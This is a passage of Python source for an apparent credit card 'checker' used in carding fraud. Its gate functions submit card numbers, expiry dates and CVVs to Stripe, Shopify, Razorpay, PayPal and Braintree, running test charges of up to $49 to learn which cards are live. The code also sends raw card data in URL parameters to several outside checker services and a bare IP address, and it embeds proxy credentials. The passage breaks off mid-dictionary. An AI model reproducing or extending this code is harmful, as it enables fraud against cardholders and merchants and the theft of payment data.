                'message': f'Declined - {_decline.get(code, msg)}',
                'time': round(time_module.time() - start_time, 2)}

    pm_id  = pm_data.get('id', '')
    brand  = pm_data.get('card', {}).get('brand', '').title()
    checks = pm_data.get('card', {}).get('checks', {})
    cvc_ok = checks.get('cvc_check', '?')
    zip_ok = checks.get('address_postal_code_check', '?')

    if not pm_id:
        return {'status': 'error', 'message': 'No PM ID from Stripe', 'time': round(time_module.time() - start_time, 2)}

    # ── Step 2: server-side PaymentIntent using SK ───────────────────────────
    try:
        pi_resp = requests.post(
            'https://api.stripe.com/v1/payment_intents',
            data=urllib.parse.urlencode({
                'amount': 100,
                'currency': 'usd',
                'payment_method': pm_id,
                'confirm': 'true',
                'capture_method': 'manual',
                'description': 'Card verification',
            }),
            headers={
                'Authorization': f'Bearer {sk}',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0',
            },
            timeout=25,
        )
        pi_data = pi_resp.json()
    except Exception as e:
        # PM was valid; charge step failed
        return {'status': 'success',
                'message': f'Approved - Card Tokenised ({brand}) | SK charge error: {str(e)[:40]}',
                'time': round(time_module.time() - start_time, 2)}

    elapsed = round(time_module.time() - start_time, 2)

    pi_status  = pi_data.get('status', '')
    pi_outcome = pi_data.get('outcome', {}) or {}
    seller_msg = pi_outcome.get('seller_message', '')
    pi_err     = pi_data.get('error', {}) or {}
    pi_code    = pi_data.get('last_payment_error', {}).get('code', '') or pi_err.get('code', '')
    pi_msg     = (pi_data.get('last_payment_error', {}).get('message', '')
                  or pi_err.get('message', '') or seller_msg)

    # 3DS / requires_action
    if pi_status in ('requires_action', 'requires_source_action'):
        return {'status': 'success',
                'message': f'Approved - 3DS Required | {brand} | CVC:{cvc_ok}',
                'time': elapsed}

    if pi_status in ('succeeded', 'requires_capture'):
        return {'status': 'success',
                'message': f'Approved - Charged $1 | {seller_msg or "Card Valid"} | {brand} | CVC:{cvc_ok} ZIP:{zip_ok}',
                'time': elapsed}

    # Cancelled / declined
    _readable = {
        'card_declined':      'Card Declined',
        'insufficient_funds': 'Insufficient Funds',
        'do_not_honor':       'Do Not Honor',
        'lost_card':          'Lost Card',
        'stolen_card':        'Stolen Card',
        'expired_card':       'Expired Card',
        'incorrect_cvc':      'Incorrect CVC',
        'incorrect_zip':      'Incorrect ZIP',
        'processing_error':   'Processing Error',
        'fraudulent':         'Flagged Fraudulent',
    }
    nice = _readable.get(pi_code, pi_msg or pi_code or 'Card Declined')
    return {'status': 'success',
            'message': f'Declined - {nice} | {brand} | CVC:{cvc_ok}',
            'time': elapsed}


def check_shopify_site_gate(cc, mm, yy, cvv, site_url):
    """
    Shopify site-specific checkout gate — native replication of approvedchkr.store shopify.

    Flow (what the external API does with proxies):
      1. GET {site_url}/products.json  → find cheapest product variant
      2. POST {site_url}/cart/add.js   → add to cart
      3. POST {site_url}/checkouts     → create checkout + get payment_gateway_url
      4. POST payment_gateway_url      → submit card token
      5. Poll checkout for payment result
    """
    import urllib.parse, random, string
    start_time = time_module.time()

    if not site_url:
        return {'status': 'error', 'message': 'No Shopify site URL provided', 'time': 0}

    site_url = site_url.rstrip('/')
    if not site_url.startswith('http'):
        site_url = 'https://' + site_url

    year = f'20{yy}' if len(yy) == 2 else yy

    s = requests.Session()
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
    })

    try:
        # Step 1: find cheapest variant
        r = s.get(f'{site_url}/products.json?limit=5&sort_by=price-ascending', timeout=15)
        if r.status_code != 200:
            return {'status': 'error', 'message': f'Shopify products.json: HTTP {r.status_code}', 'time': round(time_module.time()-start_time, 2)}
        products = r.json().get('products', [])
        variant_id = None
        for p in products:
            for v in p.get('variants', []):
                if v.get('available', True):
                    variant_id = v['id']
                    break
            if variant_id:
                break
        if not variant_id:
            return {'status': 'error', 'message': 'No available products on this Shopify store', 'time': round(time_module.time()-start_time, 2)}

        # Step 2: add to cart
        s.post(f'{site_url}/cart/add.js',
               json={'id': variant_id, 'quantity': 1},
               headers={'Content-Type': 'application/json'}, timeout=12)

        # Step 3: create checkout
        rc = s.post(f'{site_url}/checkouts',
                    json={'checkout': {'email': 'test@test.com',
                                       'shipping_address': {'first_name': 'Test', 'last_name': 'User',
                                                            'address1': '123 Main St', 'city': 'New York',
                                                            'province': 'NY', 'country': 'US', 'zip': '10001'}}},
                    headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
        checkout_data = rc.json() if rc.status_code in (200, 201) else {}
        checkout = checkout_data.get('checkout', {})
        payment_url = checkout.get('payment_url', '') or checkout.get('web_payment_url', '')
        checkout_token = checkout.get('token', '')

        if not checkout_token:
            return {'status': 'error', 'message': 'Could not create Shopify checkout session', 'time': round(time_module.time()-start_time, 2)}

        # Step 4: tokenise card at Shopify PCI vault
        pci_resp = s.post(
            'https://elb.deposit.shopifycs.com/sessions',
            json={'credit_card': {
                'number': cc, 'month': int(mm), 'year': int(year),
                'verification_value': cvv, 'name': 'Test User',
            }},
            headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
            timeout=15,
        )
        pci_data = pci_resp.json() if pci_resp.status_code == 200 else {}
        card_token = pci_data.get('id')

        if not card_token:
            return {'status': 'error', 'message': 'Shopify PCI tokenisation failed', 'time': round(time_module.time()-start_time, 2)}

        # Step 5: submit payment
        pay_resp = s.post(
            f'{site_url}/checkouts/{checkout_token}/payments',
            json={'payment': {
                'payment_token': {'payment_data': card_token, 'type': 'shopify_token'},
                'amount': checkout.get('total_price', '1.00'),
                'unique_token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            }},
            headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
            timeout=20,
        )
        elapsed = round(time_module.time() - start_time, 2)
        pay_data = pay_resp.json() if pay_resp.status_code in (200, 201, 202) else {}
        payment = pay_data.get('payment', {})
        pay_txn = payment.get('transaction', {})

        if pay_txn.get('status') == 'success':
            return {'status': 'success', 'message': f'Approved - Shopify Charged | {pay_txn.get("amount","?")}', 'time': elapsed}
        if pay_txn.get('status') in ('failure', 'error'):
            msg = pay_txn.get('message', pay_txn.get('error_code', 'Declined'))
            return {'status': 'success', 'message': f'Declined - {msg}', 'time': elapsed}

        # Check errors array
        errors = pay_data.get('errors', {})
        if errors:
            errmsg = str(list(errors.values())[0][0]) if isinstance(list(errors.values())[0], list) else str(list(errors.values())[0])
            return {'status': 'success', 'message': f'Declined - {errmsg}', 'time': elapsed}

        return {'status': 'error', 'message': f'Shopify payment returned HTTP {pay_resp.status_code}', 'time': elapsed}

    except requests.Timeout:
        return {'status': 'error', 'message': 'Shopify site timeout', 'time': round(time_module.time()-start_time, 2)}
    except Exception as e:
        return {'status': 'error', 'message': f'Shopify site error: {str(e)[:70]}', 'time': round(time_module.time()-start_time, 2)}


def check_razorpay_session_gate(cc, mm, yy, cvv, rzp_key_id, rzp_key_secret):
    """
    Razorpay direct gate — native replication of approvedchkr.store razorpay.

    Flow:
      1. Create an order via Razorpay API (needs key_id + key_secret)
      2. POST card payment against that order_id
      3. Parse response for approved/declined
    """
    import base64, urllib.parse
    start_time = time_module.time()

    if not rzp_key_id or not rzp_key_secret:
        return {'status': 'error', 'message': 'Razorpay key_id and key_secret required', 'time': 0}

    year = f'20{yy}' if len(yy) == 2 else yy
    auth = base64.b64encode(f'{rzp_key_id}:{rzp_key_secret}'.encode()).decode()

    try:
        # Step 1: create order (₹100 = 10000 paise minimum)
        order_resp = requests.post(
            'https://api.razorpay.com/v1/orders',
            json={'amount': 100, 'currency': 'INR', 'payment_capture': 1},
            headers={'Authorization': f'Basic {auth}', 'Content-Type': 'application/json'},
            timeout=15,
        )
        order_data = order_resp.json() if order_resp.status_code in (200, 201) else {}
        order_id = order_data.get('id')

        if not order_id:
            err = order_data.get('error', {}).get('description', 'Could not get session token')
            return {'status': 'success', 'message': f'Declined - {err}', 'time': round(time_module.time()-start_time, 2)}

        # Step 2: submit card payment
        pay_resp = requests.post(
            f'https://api.razorpay.com/v1/payments/create/json',
            data=urllib.parse.urlencode({
                'key_id': rzp_key_id,
                'order_id': order_id,
                'amount': 100,
                'currency': 'INR',
                'email': 'test@test.com',
                'contact': '9999999999',
                'method': 'card',
                'card[number]': cc,
                'card[expiry_month]': mm,
                'card[expiry_year]': year,
                'card[cvv]': cvv,
                'card[name]': 'Test User',
            }),
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0',
                'Origin': 'https://api.razorpay.com',
            },
            timeout=20,
        )
        elapsed = round(time_module.time() - start_time, 2)
        pay_data = pay_resp.json() if pay_resp.status_code in (200, 201) else {}

        if pay_data.get('razorpay_payment_id'):
            return {'status': 'success', 'message': f'Approved - Razorpay | {pay_data.get("razorpay_payment_id")}', 'time': elapsed}

        # Check for 3DS / redirect
        if pay_data.get('next') or pay_data.get('url'):
            return {'status': 'success', 'message': 'Approved - 3DS Required (Razorpay)', 'time': elapsed}

        err_desc = (pay_data.get('error', {}).get('description', '')
                    or pay_data.get('error', {}).get('field', '')
                    or pay_data.get('message', 'Declined'))
        return {'status': 'success', 'message': f'Declined - {err_desc}', 'time': elapsed}

    except requests.Timeout:
        return {'status': 'error', 'message': 'Razorpay timeout', 'time': round(time_module.time()-start_time, 2)}
    except Exception as e:
        return {'status': 'error', 'message': f'Razorpay error: {str(e)[:70]}', 'time': round(time_module.time()-start_time, 2)}


def check_approvedchkr_api(cc, mm, yy, cvv, gateway, api_key, **extra_params):
    """
    Thin wrapper that calls approvedchkr.store/api/v1/check.php directly.
    Use this if you want to proxy through their API instead of running natively.

    gateway: 'sk-based' | 'shopify' | 'razorpay'
    extra_params: sk=, pk=  (sk-based) | url=  (shopify)
    """
    start_time = time_module.time()
    params = {
        'api_key': api_key,
        'gateway': gateway,
        'cc': f'{cc}|{mm}|{yy}|{cvv}',
        **extra_params,
    }
    try:
        r = requests.get(
            get_gate_cfg('approvedchkr_url', 'https://approvedchkr.store/api/v1/check.php'),
            params=params,
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=30,
        )
        elapsed = round(time_module.time() - start_time, 2)
        text = r.text.strip()

        # Parse plain-text response
        if text.startswith('APPROVED:'):
            return {'status': 'success', 'message': text[9:].strip(), 'time': elapsed}
        if text.startswith('DECLINED:'):
            return {'status': 'success', 'message': f'Declined - {text[9:].strip()}', 'time': elapsed}
        if text.startswith('ERROR:'):
            return {'status': 'error', 'message': text[6:].strip(), 'time': elapsed}

        # JSON response
        try:
            data = r.json()
            err = data.get('error', str(data))
            code = r.status_code
            if code == 401:
                return {'status': 'error', 'message': f'API auth failed: {err}', 'time': elapsed}
            if code == 404:
                return {'status': 'error', 'message': f'Gateway not found: {err}', 'time': elapsed}
            return {'status': 'error', 'message': err, 'time': elapsed}
        except Exception:
            pass

        return {'status': 'error', 'message': text[:100] or f'HTTP {r.status_code}', 'time': elapsed}

    except requests.Timeout:
        return {'status': 'error', 'message': 'approvedchkr.store API timeout', 'time': 30}
    except Exception as e:
        return {'status': 'error', 'message': f'API error: {str(e)[:60]}', 'time': 0}


def check_pp_keybased_gate(cc, mm, yy, cvv, client_id=None, client_secret=None):
    """PP KeyBased — create PayPal order to validate card"""
    import base64, urllib.parse
    start_time = time_module.time()
    if not client_id or not client_secret:
        return {'status': 'error',
                'message': 'No PayPal credentials configured. Add Client ID and Secret in form.',
                'time': 0}
    try:
        creds = base64.b64encode(f'{client_id}:{client_secret}'.encode()).decode()
        token_resp = requests.post(
            'https://api-m.paypal.com/v1/oauth2/token',
            headers={'Authorization': f'Basic {creds}', 'Content-Type': 'application/x-www-form-urlencoded'},
            data='grant_type=client_credentials', timeout=15)
        elapsed_token = time_module.time() - start_time
        if token_resp.status_code != 200:
            return {'status': 'error', 'message': 'Invalid PayPal credentials', 'time': round(elapsed_token, 2)}
        access_token = token_resp.json().get('access_token', '')
        year = f'20{yy}' if len(yy) == 2 else yy
        order_payload = {
            'intent': 'CAPTURE',
            'purchase_units': [{'amount': {'currency_code': 'USD', 'value': '1.00'}}],
            'payment_source': {
                'card': {
                    'number': cc,
                    'expiry': f'{year}-{mm}',
                    'security_code': cvv,
                }
            }
        }
        order_resp = requests.post(
            'https://api-m.paypal.com/v2/checkout/orders',
            headers={'Authorization': f'Bearer {access_token}',
                     'Content-Type': 'application/json'},
            json=order_payload, timeout=30)
        elapsed = time_module.time() - start_time
        try:
            data = order_resp.json()
        except Exception:
            data = {}
        if order_resp.status_code in (200, 201):
            status_val = data.get('status', '')
            return {'status': 'success', 'message': f'Approved - {status_val}', 'time': round(elapsed, 2)}
        err_details = data.get('details', [{}])
        msg = err_details[0].get('description', data.get('message', 'Declined')) if err_details else data.get('message', 'Declined')
        return {'status': 'success', 'message': f'Declined - {msg}', 'time': round(elapsed, 2)}
    except requests.Timeout:
        return {'status': 'error', 'message': 'Request timeout', 'time': 30}
    except Exception as e:
        return {'status': 'error', 'message': f'Error: {str(e)[:60]}', 'time': 0}


def check_pp2_gate(cc, mm, yy, cvv):
    """PP #2 — PayPal AVS check via Netherex"""
    start_time = time_module.time()
    try:
        year = f'20{yy}' if len(yy) == 2 else yy
        card_str = f'{cc}|{mm}|{year}|{cvv}'
        params = {'card': card_str, 'auth': _netherex_stripe_key()}
        headers = {'User-Agent': 'Mozilla/5.0'}
        resp = requests.get(get_gate_cfg('netherex_paypal_url', 'https://checker.netherex.xyz/paypalcheck.php'),
                            params=params, headers=headers, timeout=30)
        elapsed = time_module.time() - start_time
        if resp.status_code == 200:
            try:
                data = resp.json()
            except Exception:
                data = {}
            return _parse_cybor_response(resp.text, data, elapsed)
        return {'status': 'error', 'message': f'API Error: {resp.status_code}', 'time': round(elapsed, 2)}
    except requests.Timeout:
        return {'status': 'error', 'message': 'Request timeout', 'time': 30}
    except Exception as e:
        return {'status': 'error', 'message': f'Error: {str(e)[:60]}', 'time': 0}


def check_b3_variant_gate(variant, cc, mm, yy, cvv):
    """B3 #1 / B3 #2 — Braintree variants via vkrm.site"""
    import asyncio
    start_time = time_module.time()
    try:
        from modules.b3_gate import check_b3
        proxy_map = {
            'b31': 'unew.quantumproxies.net:10000:Quantum-3f777gyjdWSRdz6IL:gfj2am3i',
            'b32': 'unew.quantumproxies.net:10000:Quantum-3f777gyjdWSRdz6IL:gfj2am3i',
        }
        result = asyncio.run(check_b3(cc, mm, yy, cvv))
        elapsed = time_module.time() - start_time
        status_val = result.get('status', 'ERROR').upper()
        msg = result.get('response', 'No response')
        if status_val in ('CHARGED', 'LIVE', 'CCN', 'CVV'):
            return {'status': 'success', 'message': f'Approved - {msg}', 'time': round(elapsed, 2)}
        elif status_val in ('DEAD', 'DECLINED', 'INVALID'):
            return {'status': 'success', 'message': f'Declined - {msg}', 'time': round(elapsed, 2)}
        return {'status': 'success', 'message': f'Response - {msg}', 'time': round(elapsed, 2)}
    except Exception as e:
        return {'status': 'error', 'message': f'Error: {str(e)[:60]}', 'time': round(time_module.time() - start_time, 2)}


def check_generic_gate(gate_name, cc, mm, yy, cvv):
    """Generic gate checker with gate-specific API endpoints"""
    start_time = time_module.time()
    
    try:
        # Convert YY to YYYY if needed
        if len(yy) == 2:
            year = f"20{yy}"
        else:
            year = yy
        
        # Build the lista parameter
        lista = f"{cc}|{mm}|{year}|{cvv}"
        lista_short = f"{cc}|{mm}|{yy}|{cvv}"
        
        # Gate-specific API endpoints mapping (shared provider base URLs)
        _chg = get_gate_cfg('stripe_charge_url', 'http://15.204.130.9:6969/check')
        _fck_st = get_gate_cfg('freechk_stripe_url', 'https://freechk.cards/free/stripe.php')
        _fck_bt = get_gate_cfg('freechk_braintree_url', 'https://freechk.cards/free/braintree.php')
        _fck_sq = get_gate_cfg('freechk_square_url', 'https://freechk.cards/free/square.php')
        _fck_pp = get_gate_cfg('freechk_paypal_url', 'https://freechk.cards/free/paypal.php')
        _nyx_st = get_gate_cfg('nyvexis_stripe_url', 'https://api.nyvexis.com/stripeauth/')
        _nyx_bt = get_gate_cfg('nyvexis_braintree_url', 'https://api.nyvexis.com/braintree/')
        _nyx_pp = get_gate_cfg('nyvexis_paypal_url', 'https://api.nyvexis.com/paypal/')

        def _gov(gate, idx, full_url):
            """Return per-gate URL override if set, else the provider-derived URL."""
            ov = get_gate_cfg(f'generic_{gate}_url{idx}', '').strip()
            return ov if ov else full_url

        gate_urls = {
            'ss': [  # Stripe Auth
                _gov('ss', 1, f"{_chg}?cc={lista}&gate=stripe_auth"),
                _gov('ss', 2, f"{_fck_st}?lista={lista}"),
                _gov('ss', 3, f"{_nyx_st}?lista={lista_short}"),
            ],
            'bu': [  # Braintree Auth
                _gov('bu', 1, f"{_chg}?cc={lista}&gate=braintree"),
                _gov('bu', 2, f"{_fck_bt}?lista={lista}"),
                _gov('bu', 3, f"{_nyx_bt}?lista={lista_short}"),
            ],
            'sq': [  # Square Auth
                _gov('sq', 1, f"{_chg}?cc={lista}&gate=square"),
                _gov('sq', 2, f"{_fck_sq}?lista={lista}"),
            ],
            'pp': [  # PayPal $1
                _gov('pp', 1, f"{_chg}?cc={lista}&gate=paypal"),
                _gov('pp', 2, f"{_fck_pp}?lista={lista}"),
                _gov('pp', 3, f"{_nyx_pp}?lista={lista_short}&amount=1"),
            ],
            'sor': [  # Stripe $2
                _gov('sor', 1, f"{_chg}?cc={lista}&gate=stripe2"),
                _gov('sor', 2, f"{_fck_st}?lista={lista}&amount=2"),
            ],
            'st5': [  # Stripe $5
                _gov('st5', 1, f"{_chg}?cc={lista}&gate=stripe5"),
                _gov('st5', 2, f"{_fck_st}?lista={lista}&amount=5"),
            ],
            'st12': [  # Stripe $12
                _gov('st12', 1, f"{_chg}?cc={lista}&gate=stripe12"),
                _gov('st12', 2, f"{_fck_st}?lista={lista}&amount=12"),
            ],
            'str': [  # Stripe $15
                _gov('str', 1, f"{_chg}?cc={lista}&gate=stripe15"),
                _gov('str', 2, f"{_fck_st}?lista={lista}&amount=15"),
            ],
            'dep': [  # Stripe $49
                _gov('dep', 1, f"{_chg}?cc={lista}&gate=stripe49"),
                _gov('dep', 2, f"{_fck_st}?lista={lista}&amount=49"),
            ],
        }

        # Get gate-specific URLs or use default
        urls = gate_urls.get(gate_name, [
            _gov(gate_name, 1, f"{_chg}?cc={lista}"),
            _gov(gate_name, 2, f"{_fck_st}?lista={lista}"),
        ])
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
        
        for url in urls:
            try:
                response = requests.get(url, headers=headers, timeout=10)
                elapsed = time_module.time() - start_time
                
                if response.status_code == 200:
                    try:
                        data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {"response": response.text}
                    except:
                        data = {"response": response.text}
                    
                    response_text = str(data).lower()
                    
                    if not response_text or len(response_text) < 5:
                        continue
                    
                    # Check for API credit/limit issues - skip to next API
                    credit_issues = ['no have credits', 'no credits', 'out of credits', 'add more credits', 
                                    'buy credits', 'insufficient credits', 'credit limit', 'api limit']
                    if any(issue in response_text for issue in credit_issues):
                        continue  # Try next API endpoint
                    
                    # Check response
                    decline_keywords = ['declined', 'failed', 'error', 'invalid', 'expired', 'rejected', 'denied']
                    if any(kw in response_text for kw in decline_keywords):
                        return {
                            "status": "success",
                            "message": data.get("message", data.get("response", "Card Declined")),
                            "time": round(elapsed, 2)
                        }
                    
                    # Return any valid response
                    actual_msg = data.get("message", data.get("response", response_text[:100]))
                    return {
                        "status": "success",
                        "message": actual_msg,
                        "time": round(elapsed, 2)
                    }
            except:
                continue
        
        # If no URL worked, return proper error
        elapsed = time_module.time() - start_time
        gate_names = {
            'ss': 'Stripe Auth', 'bu': 'Braintree Auth', 'sq': 'Square Auth',
            'pp': 'PayPal $1', 'sor': 'Stripe $2', 'st5': 'Stripe $5',
            'st12': 'Stripe $12', 'str': 'Stripe $15', 'dep': 'Stripe $49'
        }
        gate_display = gate_names.get(gate_name, gate_name.upper())
        return {
            "status": "error",
            "message": f"{gate_display} - All APIs exhausted. Try another gate.",
            "time": round(elapsed, 2)
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Gate connection error: {str(e)[:50]}",
            "time": 0
        }

def check_card_php(gate_name, cc, mm, yy, cvv, user_id,
                   sk_key=None, pp_client_id=None, pp_client_secret=None):
    
    try:
        if not cc or not mm or not yy or not cvv:
            return {
                "status": "error",
                "message": "Missing card details",
                "time": 0
            }
        
        # Ensure all fields are numeric and proper length
        if not cc.isdigit():
            return {"status": "error", "message": "Invalid card format", "time": 0}
        if not mm.isdigit() or len(mm) != 2:
            return {"status": "error", "message": "Invalid card format", "time": 0}
        if not cvv.isdigit() or len(cvv) < 3:
            return {"status": "error", "message": "Invalid card format", "time": 0}
        
        # Convert 4-digit year to 2-digit (e.g., 2026 -> 26)
        if len(yy) == 4 and yy.isdigit():
            yy = yy[-2:]
        elif not (yy.isdigit() and len(yy) == 2):
            return {"status": "error", "message": "Invalid card format", "time": 0}
        
        # Use special APIs for certain gates
        if gate_name == 'st':
            return check_stripe_newrp_gate(cc, mm, yy, cvv)
        if gate_name == 'b3':
            return check_braintree_gate(cc, mm, yy, cvv)
        if gate_name == 'rz':
            return check_razorpay_gate(cc, mm, yy, cvv)
        if gate_name == 'stm':
            return check_stripe_mass_auth_gate(cc, mm, yy, cvv)
        if gate_name == 'se1':
            return check_stripe_charge_gate(cc, mm, yy, cvv)
        if gate_name == 'sh':
            return check_shopify_netherex_gate(cc, mm, yy, cvv)
        if gate_name == 'ss':
            return check_stripe_auth_gate(cc, mm, yy, cvv)
        if gate_name in ['st5', 'st12', 'str', 'dep', 'sor']:
            return check_stripe_amount_gate(cc, mm, yy, cvv, gate_name)

        # Cybor gates — Stripe Auth V1/V2/V3
        if gate_name in ('stv1', 'stv2', 'stv3'):
            return check_stv_gate(gate_name, cc, mm, yy, cvv)

        # Cybor gates — Shopii #1-4
        if gate_name in ('shopii1', 'shopii2', 'shopii3', 'shopii4'):
            return check_shopii_gate(gate_name, cc, mm, yy, cvv)

        # SK-Based CVV
        if gate_name == 'skbased':
            effective_sk = sk_key
            if not effective_sk:
                try:
                    from config import DB_SETTINGS
                    with open(DB_SETTINGS, 'r') as f:
                        for line in f:
                            if line.startswith('default_sk_key='):
                                effective_sk = line.split('=', 1)[1].strip()
                                break
                except Exception:
                    pass
            return check_skbased_gate(cc, mm, yy, cvv, sk_key=effective_sk)

        # PP KeyBased
        if gate_name == 'ppkb':
            return check_pp_keybased_gate(cc, mm, yy, cvv,
                                          client_id=pp_client_id,
                                          client_secret=pp_client_secret)

        # PP #2 (via Netherex PayPal endpoint)
        if gate_name == 'pp2':
            return check_pp2_gate(cc, mm, yy, cvv)

        # B3 #1 / B3 #2
        if gate_name in ('b31', 'b32'):
            return check_b3_variant_gate(gate_name, cc, mm, yy, cvv)

        # Use generic gate checker for all other gates
        return check_generic_gate(gate_name, cc, mm, yy, cvv)
            
    except Exception as e:
        return {
            "status": "error",
            "message": f"Checker Error: {str(e)}",
            "time": 0
        }

_BIN_CACHE = {}

def get_bin_info(cc):
    import requests

    bin_number = cc[:6] if len(cc) >= 6 else 'XXXXXX'

    if bin_number in _BIN_CACHE:
        return _BIN_CACHE[bin_number]

    apis = [
        f"https://lookup.binlist.net/{bin_number}",
        f"https://bins.antipublic.cc/bins/{bin_number}",
    ]

    for api_url in apis:
        try:
            response = requests.get(api_url, timeout=3)
            if response.status_code == 200:
                data = response.json()
                
                if 'scheme' in data:
                    brand = data.get('scheme', 'VISA').upper()
                    card_type = data.get('type', 'CREDIT').upper()
                    level = data.get('prepaid', False)
                    bank_data = data.get('bank', {})
                    bank = bank_data.get('name', 'BANK') if bank_data else 'BANK'
                    country_data = data.get('country', {})
                    country = country_data.get('name', 'UNITED STATES') if country_data else 'UNITED STATES'
                    country_code = country_data.get('alpha2', 'US') if country_data else 'US'
                    emoji = country_data.get('emoji', '🇺🇸') if country_data else '🇺🇸'

                    result = {
                        'bin': bin_number,
                        'brand': brand,
                        'type': card_type,
                        'level': 'DEBIT' if level else 'CREDIT',
                        'bank': bank,
                        'country': country,
                        'country_code': country_code,
                        'emoji': emoji
                    }
                    _BIN_CACHE[bin_number] = result
                    return result
        except Exception as e:
            print(f"BIN lookup error for {api_url}: {e}")
            continue

    bin_first_digit = bin_number[0] if bin_number else '4'

    if bin_first_digit == '4':
        brand = 'VISA'
    elif bin_first_digit == '5':
        brand = 'MASTERCARD'
    elif bin_first_digit == '3':
        brand = 'AMEX'
    elif bin_first_digit == '6':
        brand = 'DISCOVER'
    else:
        brand = 'VISA'

    fallback = {
        'bin': bin_number,
        'brand': brand,
        'type': 'CREDIT',
        'level': 'STANDARD',
        'bank': 'BANK',
        'country': 'UNITED STATES',
        'country_code': 'US',
        'emoji': '🇺🇸'
    }
    _BIN_CACHE[bin_number] = fallback
    return fallback

def clean_json_response(msg):
    """Extract clean message from JSON response strings"""
    import re
    
    # Check if the message looks like JSON
    if msg.startswith('{') and msg.endswith('}'):
        try:
            data = json.loads(msg)
            if isinstance(data, dict):
                # Try to extract clean response from nested structure
                if 'data' in data and isinstance(data['data'], dict):
                    inner = data['data']
                    reason = inner.get('response', inner.get('message', inner.get('status', '')))
                    if reason:
                        return str(reason).replace('_', ' ').title()
                # Try direct fields
                for field in ['response', 'message', 'status', 'error', 'reason']:
                    if field in data and data[field]:
                        val = data[field]
                        if isinstance(val, str):
                            return val.replace('_', ' ').title()
        except:
            pass
    return msg

def format_gate_response(result, gate_name, cc, mm, yy, cvv, username, elapsed_time=0):
    
    # Clean the message from decorative elements
    if result.get("message"):
        msg = result["message"]
        
        # First, try to clean JSON responses
        if '{' in msg and '}' in msg:
            # Find JSON object - handle nested braces
            start_idx = msg.find('{')
            if start_idx != -1:
                prefix = msg[:start_idx].strip().rstrip('-').strip()
                json_str = msg[start_idx:]
                # Fix Python-style booleans to JSON-style
                json_str = json_str.replace('False', 'false').replace('True', 'true').replace('None', 'null')
                # Try to parse entire JSON from this point
                try:
                    data = json.loads(json_str)
                    if isinstance(data, dict):
                        extracted = None
                        # Deep extraction for nested structures like Data.Error.Message
                        if 'Data' in data and isinstance(data['Data'], dict):
                            inner = data['Data']
                            if 'Error' in inner and isinstance(inner['Error'], dict):
                                extracted = inner['Error'].get('Message', inner['Error'].get('message', ''))
                            elif 'error' in inner and isinstance(inner['error'], dict):
                                extracted = inner['error'].get('Message', inner['error'].get('message', ''))
                            else:
                                extracted = inner.get('response', inner.get('message', inner.get('Message', '')))
                        # Also check lowercase 'data'
                        elif 'data' in data and isinstance(data['data'], dict):
                            inner = data['data']
                            if 'error' in inner and isinstance(inner['error'], dict):
                                extracted = inner['error'].get('message', inner['error'].get('Message', ''))
                            elif 'Error' in inner and isinstance(inner['Error'], dict):
                                extracted = inner['Error'].get('Message', inner['Error'].get('message', ''))
                            else:
                                extracted = inner.get('response', inner.get('message', inner.get('status', '')))
                        # Try direct fields
                        if not extracted:
                            for field in ['response', 'message', 'Message', 'error', 'Error', 'reason']:
                                if field in data:
                                    val = data[field]
                                    if isinstance(val, str):
                                        extracted = val
                                        break
                                    elif isinstance(val, dict):
                                        extracted = val.get('message', val.get('Message', ''))
                                        if extracted:
                                            break
                        if extracted and isinstance(extracted, str):
                            clean_msg = extracted.replace('_', ' ')
                            # Don't re-capitalize if already has proper case
                            if clean_msg.islower():
                                clean_msg = clean_msg.title()
                            msg = clean_msg
                except:
                    # If JSON parse fails, try regex to extract message
                    match = re.search(r'"[Mm]essage"\s*:\s*"([^"]+)"', json_str)
                    if match:
                        msg = match.group(1)
        
        # Sanitize HTML - remove ALL HTML tags from external API responses (they can be malformed)
        msg = re.sub(r'<br\s*/?>', ' ', msg, flags=re.IGNORECASE)
        msg = re.sub(r'<[^>]+>', '', msg)  # Remove all HTML tags completely
        msg = re.sub(r'&nbsp;', ' ', msg, flags=re.IGNORECASE)
        msg = re.sub(r'&amp;', '&', msg, flags=re.IGNORECASE)
        msg = re.sub(r'&lt;', '<', msg, flags=re.IGNORECASE)
        msg = re.sub(r'&gt;', '>', msg, flags=re.IGNORECASE)
        msg = re.sub(r'\s+', ' ', msg).strip()  # Normalize whitespace
        result["message"] = msg
        
        # Remove all decorative boxes and headers
        decorative_items = [
            'CC CHECKING', 'Transaction', 'BIN DETAILS', 'CHECK INFO',
            'CARD →', 'STATUS →', 'RESPONSE →', 'GATEWAY →',
            'Bin →', 'Bank →', 'Country →', 'Proxy →',
            '═════', '║', '╔', '╚', '║',
            'RESPONSE', 'GATEWAY', 'Bin Details', 'Check Info', 'Proxy'
        ]
        
        lines = msg.split('\n')
        clean_lines = []
        
        for line in lines:
            # Skip empty lines and decorative lines
            if not line.strip():
                continue
            if any(item in line for item in ['═', '║', '╔', '╚', '🎀']):
                continue
            if any(header in line for header in ['CC CHECKING', 'Transaction', 'BIN DETAILS', 'CHECK INFO']):
                continue
            
            # Extract actual info if it has → in it
            if '→' in line:
                parts = line.split('→')
                if len(parts) > 1:
                    value = parts[1].strip()
                    clean_lines.append(value)
            elif line.strip():
                clean_lines.append(line.strip())
        
        # Keep only the response message
        clean_msg = ' '.join(clean_lines).strip() if clean_lines else result["message"]
        
        # Additional cleanup for common patterns
        if "Warning:" in clean_msg or "Deprecated:" in clean_msg or "Fatal error:" in clean_msg:
            clean_lines = [l for l in clean_msg.split() if not any(x in l for x in ['Warning:', 'Deprecated:', 'Fatal error:', 'on line', '.php'])]
            clean_msg = ' '.join(clean_lines).strip() if clean_lines else "Card Checked"
        
        result["message"] = clean_msg
    
    bin_info = get_bin_info(cc)

    gate_names = {
        'st': 'Stripe Auth', 'ss': 'Stripe Auth $0.5', 'bu': 'Braintree Auth',
        'sq': 'Square Auth', 'pp': 'PayPal $1', 'ppv': 'PayPal V2',
